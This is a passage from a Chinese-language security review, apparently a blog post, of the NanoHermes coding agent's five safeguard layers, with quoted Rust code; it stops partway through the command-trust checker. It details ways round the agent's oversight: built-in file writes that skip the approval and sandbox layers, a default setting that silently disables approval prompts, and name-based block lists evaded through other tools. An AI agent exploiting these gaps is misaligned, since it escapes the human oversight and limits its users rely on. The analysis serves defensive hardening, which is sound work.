<h2>前言：安全不是一个开关，是五道独立的闸门</h2>

给 Agent 加安全，最常见的做法是加一个 <code>--safe</code> 开关。这个做法必然失败，因为安全问题不是一个维度的问题：
<ul>
<li>模型想调用一个不该存在的工具</li>
<li>模型调用了合法工具，但参数指向了工作区之外</li>
<li>模型的命令看起来只读，实际能写文件</li>
<li>模型确实需要跑一条危险命令，但它不该在没有人类同意时跑</li>
<li>命令本身合法，但它 spawn 的子进程做了别的事</li>
</ul>

这五种情况需要五种不同的拦截点。所以「安全」的正确定义不是「一个开关」，而是<strong>一组按顺序生效的闸门，每道闸门负责一个维度，且任何一道都不依赖其他道来兜底</strong>。

NanoHermes 有五道：工具清单（模型能看见什么）、权限模式（这一轮允许做什么）、PreToolUse 钩子（用户自定义的否决）、命令审批（跑之前问人）、Landlock 沙箱（内核层面的文件系统限制）。它们分布在完全不同的层——从 JSON 生成到内核系统调用——这种分散本身就是设计意图：<strong>一层被绕过，还有下一层</strong>。

本文按调用链的顺序走这五道闸门，然后专门拆解每一道单独失效时会发生什么。最后一节给出七个真实可复现的攻击场景和七处加固建议。
<h2>结论先行：五道闸门与它们各自的失效模式</h2>

先看全景。一次工具调用从模型输出到真正执行，经过的检查是严格有序的：

<thead>
<tr>
<th>顺序</th>
<th>闸门</th>
<th>位置</th>
<th>挡住了什么</th>

</thead>
<tbody>
<tr>
<td>1</td>
<td>工具清单过滤</td>
<td><code>build_tools</code></td>
<td>模型看不到被封禁的工具</td>
<td>模型尝试调用，被第 2 道拦下</td>
</tr>
<tr>
<td>2</td>
<td><code>check_tool</code></td>
<td><code>execute</code> 第一行</td>
<td>模式封禁 + 黑名单 + 白名单</td>
<td>任意工具可执行</td>
</tr>
<tr>
<td>3</td>
<td>PreToolUse 钩子</td>
<td><code>execute</code> 中段</td>
<td>用户脚本的非零退出</td>
<td>用户自定义策略失效</td>
</tr>
<tr>
<td>4</td>
<td>命令审批</td>
<td><code>run_command</code> / <code>git_commit</code></td>
<td>非只读命令</td>
<td>危险命令无人工确认即执行</td>
</tr>
<tr>
<td>5</td>
<td>Landlock</td>
<td><code>pre_exec</code>（子进程）</td>
<td>沙箱外的文件写入</td>
<td>子进程可写全盘</td>
</tr>

五道闸门的覆盖面是嵌套的，不是并列的：
<ul>
<li>第 1 道是「广告」层，只管模型看见什么，不负责拦截</li>
<li>第 2、3 道是「工具级」，对每个工具调用都生效</li>
<li>第 4 道是「命令级」，只对 <code>run_command</code> 和 <code>git_commit</code> 生效</li>
<li>第 5 道是「进程级」，只对 <code>Command::spawn</code> 出来的子进程生效</li>
</ul>

这个嵌套关系直接决定了最关键的一个结论：<strong>内置文件工具（<code>read_file</code>、<code>write_file</code>、<code>edit_file</code>、<code>apply_patch</code>）只受第 2、3 道管，完全不受第 4、5 道管</strong>。也就是说，命令审批和内核沙箱再好，也挡不住 agent 自己用 <code>write_file</code> 往 <code>/etc/</code> 里写东西——因为它根本没有 spawn 子进程。
<h2>权限模式：五种模式到底挡了什么</h2>

<code>PermissionMode</code> 是这套安全模型里最上层的抽象，五种模式各自回答一个不同的问题：
<div class="table-scroll"><table>
<thead>
<tr>
<th>模式</th>
<th>意图</th>
<th>封禁的工具</th>
<th>auto_approve</th>
<th>审批策略</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>default</code></td>
<td>正常干活</td>
<td>无</td>
<td>继承配置</td>
<td>继承配置</td>
</tr>
<tr>
<td><code>accept-edits</code></td>
<td>文件改动免问，命令仍问</td>
<td>无</td>
<td>强制 false</td>
<td>继承配置</td>
</tr>
<tr>
<td><code>plan</code></td>
<td>只读分析</td>
<td>写文件、打补丁、跑命令、提交</td>
<td>继承配置</td>
<td>继承配置</td>
</tr>
<tr>
<td><code>goal</code></td>
<td>无人值守跑到目标</td>
<td>无</td>
<td>强制 true</td>
<td>强制 never</td>
</tr>
<tr>
<td><code>debug</code></td>
<td>复现问题但别改坏</td>
<td>写文件、打补丁、提交</td>
<td>继承配置</td>
<td>继承配置</td>
</tr>
</tbody>
</table></div>

三条设计逻辑值得单独说。

<strong><code>accept-edits</code> 是最反直觉的一个。</strong> 它的名字暗示「放宽」，实现却是把 <code>auto_approve</code> 强制成 false——因为在这个模式下，免问的只有文件编辑，而「命令仍然要问」这件事必须显式保证。如果它继承配置里的 <code>auto_approve: true</code>，整个模式就变成了「什么都不问」。代码里的注释写得很直白：
<div class="codehilite"><pre><span></span><code><span class="sd">/// `AcceptEdits` always keeps shell confirmation on; `Goal` has nobody to</span>
<span class="sd">/// ask, so it never blocks; the rest inherit the configured flag.</span>
<span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">auto_approve</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">configured</span><span class="p">:</span><span class="w"> </span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="bp">self</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">PermissionMode</span><span class="p">::</span><span class="n">AcceptEdits</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="n">PermissionMode</span><span class="p">::</span><span class="n">Goal</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="n">PermissionMode</span><span class="p">::</span><span class="nb">Default</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PermissionMode</span><span class="p">::</span><span class="n">Plan</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">PermissionMode</span><span class="p">::</span><span class="n">Debug</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">configured</span><span class="p">,</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


<strong><code>goal</code> 是唯一一个主动放弃人类监督的模式。</strong> 它同时做两件事：把 <code>auto_approve</code> 强制成 true，把审批策略强制成 <code>Never</code>。理由写在文档注释里：「没有人在旁边可以问」。这是诚实的做法——与其假装会问、实际永远超时失败，不如明确宣布不问。

<strong><code>plan</code> 和 <code>debug</code> 的区别在 <code>run_command</code>。</strong> <code>plan</code> 封禁它，<code>debug</code> 允许它。理由也清楚：<code>plan</code> 是「读代码想方案」，<code>debug</code> 是「跑起来复现问题」。但两个模式对文件写入的态度完全一致——都封。这一点经常被误解为「<code>debug</code> 比 <code>plan</code> 危险」，实际上它们的危险面是正交的：<code>debug</code> 允许执行任意代码，<code>plan</code> 不允许。
<h2>默认配置的真实姿态</h2>

把默认值摊开看，会发现一个和文档预期不一致的地方：
<div class="codehilite"><pre><span></span><code><span class="n">auto_approve</span><span class="p">:</span><span class="w"> </span><span class="nc">true</span><span class="p">,</span>
<span class="n">approval_policy</span><span class="p">:</span><span class="w"> </span><span class="nc">ApprovalPolicy</span><span class="p">::</span><span class="n">Untrusted</span><span class="p">,</span>
<span class="n">sandbox</span><span class="p">:</span><span class="w"> </span><span class="nc">SandboxMode</span><span class="p">::</span><span class="n">Off</span><span class="p">,</span>
<span class="n">permission_mode</span><span class="p">:</span><span class="w"> </span><span class="nc">PermissionMode</span><span class="p">::</span><span class="nb">Default</span><span class="p">,</span>
</code></pre></div>


<code>auto_approve</code> 的默认值是 <strong>true</strong>。而 <code>needs_approval</code> 的第一行就是：
<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="n">auto_approve</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>


所以默认配置下，<code>approval_policy: Untrusted</code>（「每条命令都问」）<strong>完全不起作用</strong>——它被短路了。同样的，<code>sandbox: Off</code> 意味着 Landlock 根本不会被挂上。

也就是说，不带任何 flag 直接跑 <code>nanohermes "改掉这个 bug"</code>，真实姿态是：<strong>所有工具可用、所有命令不询问、文件系统无限制</strong>。

而 CLI 帮助文本写的是：
<div class="codehilite"><pre><span></span><code>--approval-policy &lt;P&gt;   never | on-request | untrusted (default: untrusted with -y)
</code></pre></div>


「untrusted with -y」这句话有歧义：读起来像是「<code>-y</code> 时是 untrusted」。实际上 <code>-y</code> 做的是把策略设成 <code>Never</code> 并把 <code>auto_approve</code> 设成 true——和帮助文本说的正好相反。

这不是一个可以忽略的文档瑕疵。用户读帮助文本会得到一个「默认会问我」的印象，实际默认不问。安全类配置的错误默认值比缺失功能危险得多，因为它让人<strong>以为自己在被保护</strong>。

修法有两种，都不复杂：
<div class="codehilite"><pre><span></span><code><span class="c1">// 方案一：默认不自动批准，让 -y 才放开</span>
<span class="n">auto_approve</span><span class="p">:</span><span class="w"> </span><span class="nc">false</span><span class="p">,</span>
<span class="n">approval_policy</span><span class="p">:</span><span class="w"> </span><span class="nc">ApprovalPolicy</span><span class="p">::</span><span class="n">OnRequest</span><span class="p">,</span>

<span class="c1">// 方案二：保持自动批准，但把它写进启动横幅</span>
<span class="c1">// &quot;auto-approve ON · sandbox OFF · permission=default&quot;</span>
</code></pre></div>


方案一更安全，但会改变现有用户的交互（每条非只读命令都多一次提示）。方案二不改变行为，只消除误解。对一个已经有大量自动化用法的工具，方案二是现实选择——前提是横幅必须在每一次启动时打印，而不是只在 <code>--status</code> 里。
<h2>第一道闸门 check_tool 的三层判定</h2>

<code>check_tool</code> 是唯一一个对所有工具生效的检查，三层顺序不能换：
<div class="codehilite"><pre><span></span><code><span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">check_tool</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span><span class="w"> </span><span class="nb">String</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 1. 模式级硬封禁</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">permission_mode</span><span class="p">.</span><span class="n">blocked_tools</span><span class="p">().</span><span class="n">contains</span><span class="p">(</span><span class="o">&amp;</span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span>
<span class="w">            </span><span class="s">&quot;tool `{name}` is not available in {:?} mode&quot;</span><span class="p">,</span>
<span class="w">            </span><span class="bp">self</span><span class="p">.</span><span class="n">permission_mode</span>
<span class="w">        </span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 2. 黑名单永远优先</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">disallowed_tools</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">t</span><span class="o">|</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;tool `{name}` is disallowed by configuration&quot;</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 3. 白名单只在非空时生效</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="bp">self</span><span class="p">.</span><span class="n">allowed_tools</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="bp">self</span><span class="p">.</span><span class="n">allowed_tools</span><span class="p">.</span><span class="n">iter</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">t</span><span class="o">|</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;tool `{name}` is not in the allowed list&quot;</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="nb">Ok</span><span class="p">(())</span>
<span class="p">}</span>
</code></pre></div>


三层语义各不相同：

<strong>第一层是模式，它先于用户的任何配置。</strong> 这意味着 <code>plan</code> 模式下即使你把 <code>write_file</code> 加进白名单也没用——模式封禁在最前面。这是对的：模式是「这一轮的意图」，配置是「长期偏好」，意图应该压倒偏好。

<strong>第二层是黑名单，它压过白名单。</strong> 一个人同时把工具写进两个列表时，结果是拒绝。这个选择符合安全领域的惯例：显式禁止优先于显式允许，因为「禁止」通常是在出事之后加的。

<strong>第三层是白名单，空表示「不限制」。</strong> 这里有个容易踩的语义陷阱：<code>allowed_tools: []</code> 不是「什么都不许」，而是「什么都许」。如果用户想限制成「只允许读文件」，必须写成 <code>allowed_tools: ["read_file", "list_dir", "grep", "glob"]</code>——而漏写一个工具的表现是「那个工具突然不能用了」，不是「多了不该有的能力」。这个方向是安全的（fail closed），但不符合直觉。

<code>check_tool</code> 的返回值有两种归宿，值得分清：
<div class="table-scroll"><table>
<thead>
<tr>
<th>调用点</th>
<th>失败时的表现</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>build_tools()</code>（生成工具列表）</td>
<td>工具永不出现在模型视野里</td>
</tr>
<tr>
<td><code>execute()</code>（执行前检查）</td>
<td>返回一条 <code>ERROR: ...</code> 字符串给模型</td>
</tr>
</tbody>
</table></div>

第一处是「不告诉模型」，第二处是「告诉模型它被拒了」。两处都要有，因为模型可能从历史里学到工具名（上一轮允许、这一轮被模式封禁），也可能纯粹幻觉出一个不存在的工具名。
<h2>白名单与黑名单：顺序决定语义</h2>

上一节提到顺序，这里给一个完整的真值表，因为这是配置安全时最容易搞错的地方：
<div class="table-scroll"><table>
<thead>
<tr>
<th><code>blocked_tools</code></th>
<th>黑名单</th>
<th>白名单</th>
<th>结果</th>
<th>原因</th>
</tr>
</thead>
<tbody>
<tr>
<td>命中</td>
<td>任意</td>
<td>任意</td>
<td>拒绝</td>
<td>模式优先</td>
</tr>
<tr>
<td>未命中</td>
<td>命中</td>
<td>任意</td>
<td>拒绝</td>
<td>黑名单压过白名单</td>
</tr>
<tr>
<td>未命中</td>
<td>未命中</td>
<td>空</td>
<td>允许</td>
<td>空表示不限制</td>
</tr>
<tr>
<td>未命中</td>
<td>未命中</td>
<td>命中</td>
<td>允许</td>
<td>白名单放行</td>
</tr>
<tr>
<td>未命中</td>
<td>未命中</td>
<td>未命中</td>
<td>拒绝</td>
<td>白名单非空即排他</td>
</tr>
</tbody>
</table></div>

第五行是关键：白名单一旦非空，就是<strong>排他列表</strong>。这让「渐进式收紧」变得危险——你先加了 <code>["read_file"]</code> 想看看效果，结果整个 agent 除了读文件什么都不能做。合理的做法是提供两个字段：<code>allowed_tools</code>（排他）和 <code>denied_tools</code>（追加），或者在文档里用「白名单非空即封禁其余」这样的明确措辞。

还有一个更隐蔽的问题：<strong>白名单是按工具名匹配，不是按能力匹配。</strong> 把 <code>run_command</code> 放进黑名单并不会阻止 <code>git_commit</code> 执行 <code>git commit</code>（它内部调 <code>Command</code>），也不会阻止 <code>subagent</code> 起一个子代理去改文件。工具是能力的载体，封禁工具名只是在封禁「入口」，不是封禁「能力」。

真正按能力封的是 <code>PermissionMode::Plan</code> 里的那五个工具——但它也只能封它知道的那五个。
<h2>PreToolUse 钩子：一条可以否决的工具链</h2>

第三道闸门是用户自己写的。钩子是一个外部命令，通过 stdin 收到工具调用的 JSON，通过退出码表态：
<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="n">hook</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="bp">self</span>
<span class="w">    </span><span class="p">.</span><span class="n">cfg</span>
<span class="w">    </span><span class="p">.</span><span class="n">hooks</span>
<span class="w">    </span><span class="p">.</span><span class="n">iter</span><span class="p">()</span>
<span class="w">    </span><span class="p">.</span><span class="n">filter</span><span class="p">(</span><span class="o">|</span><span class="n">h</span><span class="o">|</span><span class="w"> </span><span class="n">h</span><span class="p">.</span><span class="n">event</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">HookEvent</span><span class="p">::</span><span class="n">PreToolUse</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">h</span><span class="p">.</span><span class="n">matches</span><span class="p">(</span><span class="o">&amp;</span><span class="n">call</span><span class="p">.</span><span class="n">name</span><span class="p">))</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">hooks</span><span class="p">::</span><span class="n">run</span><span class="p">(</span><span class="n">hook</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">call</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">args</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">cfg</span><span class="p">.</span><span class="n">workspace</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="n">ok</span><span class="p">()</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{}</span>
<span class="w">        </span><span class="nb">Ok</span><span class="p">(</span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span>
<span class="w">                </span><span class="s">&quot;ERROR: `{}` blocked by PreToolUse hook (exit {}):</span><span class="se">\n</span><span class="s">{}&quot;</span><span class="p">,</span>
<span class="w">                </span><span class="n">call</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="n">code</span><span class="p">,</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="n">output</span>
<span class="w">            </span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;ERROR: PreToolUse hook failed: {e}&quot;</span><span class="p">),</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


四个设计点：

<strong>任何非零退出都算拒绝。</strong> 不区分退出码 1 和 3，也不区分「故意拒绝」和「脚本自己崩了」。这是 fail closed：钩子崩溃不该被理解成「没有意见」。

<strong>钩子的输出会原样回到模型。</strong> 所以钩子可以写「不要在 <code>src/generated/</code> 下改文件，那些是生成的」，模型能读懂。这让钩子不仅是拦截器，还是策略的传达通道。

<strong><code>PreToolUse</code> 的失败直接返回，不执行工具。</strong> 对比 <code>PostToolUse</code>：
<div class="codehilite"><pre><span></span><code><span class="nb">Ok</span><span class="p">(</span><span class="n">o</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">result</span><span class="p">.</span><span class="n">push_str</span><span class="p">(</span><span class="o">&amp;</span><span class="fm">format!</span><span class="p">(</span>
<span class="w">    </span><span class="s">&quot;</span><span class="se">\n</span><span class="s">[PostToolUse hook exited {}]</span><span class="se">\n</span><span class="s">{}&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="n">o</span><span class="p">.</span><span class="n">code</span><span class="p">,</span><span class="w"> </span><span class="n">o</span><span class="p">.</span><span class="n">output</span>
<span class="p">)),</span>
</code></pre></div>


PostToolUse 的非零退出只是往结果里追加一段文字，<strong>不影响已经发生的事实</strong>。这个不对称是对的：事后钩子没有否决权，否则你既执行了操作又声称它被拒绝，历史会自相矛盾。

<strong><code>filter</code> 里用 <code>h.matches(&amp;call.name)</code>。</strong> 匹配器支持通配（<code>*</code>）和精确名，所以可以写「所有 <code>write_*</code> 都要检查」。这个设计让钩子能表达「按工具类别」的策略，而不只是逐个列举。
<h2>钩子的边界：30 秒、无沙箱、可信配置</h2>

钩子有三个必须知道的边界。

<strong>第一，30 秒硬超时。</strong>
<div class="codehilite"><pre><span></span><code><span class="k">const</span><span class="w"> </span><span class="n">HOOK_TIMEOUT_SECS</span><span class="p">:</span><span class="w"> </span><span class="kt">u64</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">30</span><span class="p">;</span>
</code></pre></div>


超时后 <code>kill</code> 子进程，退出码记成 <code>-2</code>，输出里追加「hook timed out」。对 PreToolUse 来说，<code>-2</code> 是非零，所以超时等于拒绝。这个语义是对的——一个卡住的钩子不能让整个 agent 无限等，也不能被当成放行。

但要注意实现里的一个细节：超时分支只 <code>kill</code> 再 <code>wait</code>，然后 <code>join</code> 两个排空线程。如果钩子自己又 spawn 了子进程并且没被杀掉（<code>kill</code> 只杀直接子进程），那两个排空线程会一直等到管道 EOF——也就是等到那个孙进程退出。所以「30 秒超时」对「钩子里跑了个后台服务」这种写法并不成立。

<strong>第二，钩子没有沙箱。</strong> <code>hooks::run</code> 里对 <code>shell_command</code> 只设了 <code>current_dir</code>、<code>NANOHERMES_TOOL_NAME</code> 和 <code>NANOHERMES_HOOK_EVENT</code> 两个环境变量、以及三根管道，<strong>没有调用 <code>sandbox::attach</code></strong>。所以钩子以完整权限运行，能读写全盘。这是合理的——钩子是用户自己配的，属于「可信配置」——但它意味着 <code>sandbox: read-only</code> 这个设置对钩子完全无效。如果你的钩子命令是 <code>./scripts/check.sh</code>，而这个脚本会 clone 仓库，那它就能在工作区外写文件。

<strong>第三，钩子的失败路径会漏线程。</strong> 看这一段：
<div class="codehilite"><pre><span></span><code><span class="nb">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">Err</span><span class="p">(</span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;failed to wait for hook: {e}&quot;</span><span class="p">)),</span>
</code></pre></div>


<code>try_wait</code> 出错时直接 <code>return</code>，两个已经 <code>spawn</code> 的排空线程既没 <code>join</code> 也没被丢弃（<code>JoinHandle</code> 被 drop 等于 detach）。它们会继续跑，直到管道 EOF。这条路径概率极低（<code>try_wait</code> 只在 <code>waitpid</code> 系统调用失败时才 <code>Err</code>），但它是「泄漏一个线程」而不是「返回一个错误」——在长时间运行的守护进程里值得修。
<h2>审批策略：三个值，一个短路</h2>

第四道闸门是 <code>needs_approval</code>，它在 <code>run_command</code> 和 <code>git_commit</code> 里各调一次：
<div class="codehilite"><pre><span></span><code><span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">needs_approval</span><span class="p">(</span><span class="n">auto_approve</span><span class="p">:</span><span class="w"> </span><span class="kt">bool</span><span class="p">,</span><span class="w"> </span><span class="n">policy</span><span class="p">:</span><span class="w"> </span><span class="nc">ApprovalPolicy</span><span class="p">,</span><span class="w"> </span><span class="n">command</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">auto_approve</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="k">match</span><span class="w"> </span><span class="n">policy</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">ApprovalPolicy</span><span class="p">::</span><span class="n">Never</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span>
<span class="w">        </span><span class="n">ApprovalPolicy</span><span class="p">::</span><span class="n">Untrusted</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="n">ApprovalPolicy</span><span class="p">::</span><span class="n">OnRequest</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="o">!</span><span class="n">is_trusted_command</span><span class="p">(</span><span class="n">command</span><span class="p">),</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>


三个策略的语义：
<div class="table-scroll"><table>
<thead>
<tr>
<th>策略</th>
<th>问不问</th>
<th>典型场景</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>never</code></td>
<td>从不问</td>
<td>完全信任 / 无人值守</td>
</tr>
<tr>
<td><code>on-request</code></td>
<td>只问非只读命令</td>
<td>日常交互</td>
</tr>
<tr>
<td><code>untrusted</code></td>
<td>每条都问，包括 <code>ls</code></td>
<td>首次接触陌生仓库</td>
</tr>
</tbody>
</table></div>

<code>auto_approve</code> 的短路是第一行的绝对优先。这让「模式强制放开」可以覆盖任何策略——<code>goal</code> 模式就是这么做的。

这里有一个值得单独指出的语义问题：<strong><code>Untrusted</code> 会连 <code>ls</code> 都问。</strong> 这听起来很安全，实践里却会导致「审批疲劳」——用户问了几十次之后开始无脑按 <code>y</code>，真正的危险命令混在其中就过去了。安全设计里有个说法叫「告警疲劳是安全最大的敌人」，<code>Untrusted</code> 是它的教科书案例。

<code>OnRequest</code> 是更合理的默认值：只对非只读命令提问。它的质量完全取决于 <code>is_trusted_command</code> 判定得准不准——也就是下一节的内容。
<h2>is_trusted_command 的六条判定</h2>

这个函数是整个审批体系的核心，判定顺序是：
<div class="codehilite"><pre><span></span><code><span class="k">pub</span><span class="w"> </span><span class="k">fn</span><span class="w"> </span><span class="nf">is_trusted_command</span><span class="p">(</span><span class="n">command</span><span class="p">:</span><span class="w"> </span><span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span><span class="p">-&gt;</span><span class="w"> </span><span class="kt">bool</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">command</span><span class="p">.</span><span class="n">trim</span><span class="p">();</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">is_empty</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 1. 任何控制操作符、重定向、命令替换都直接判不可信</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">cmd</span><span class="p">.</span><span class="n">chars</span><span class="p">().</span><span class="n">any</span><span class="p">(</span><span class="o">|</span><span class="n">c</span><span class="o">|</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="fm">matches!</span><span class="p">(</span>
<span class="w">            </span><span class="n">c</span><span class="p">,</span>
<span class="w">            </span><span class="sc">&#39;|&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;&amp;&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;;&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;&lt;&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;&gt;&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;`&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;$&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;(&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;)&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="sc">&#39;\n&#39;</span>
<span class="w">        </span><span class="p">)</span>
<span class="w">    </span><span class="p">})</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">    </span><span class="c1">// 2. 跳过前置的 KEY=VALUE</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">loop</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">match</span><span class="w"> </span><span class="n">tokens</span><span class="p">.</span><span class="n">next</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nb">Some</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">is_env_assignment</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">continue</span><span class="p">,</span>
<span class="w">            </span><span class="nb">Some</span><span class="p">(</span><span class="n">t</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="k">break</span><span class="w"> </span><span class="n">t</span><span class="p">,</span>
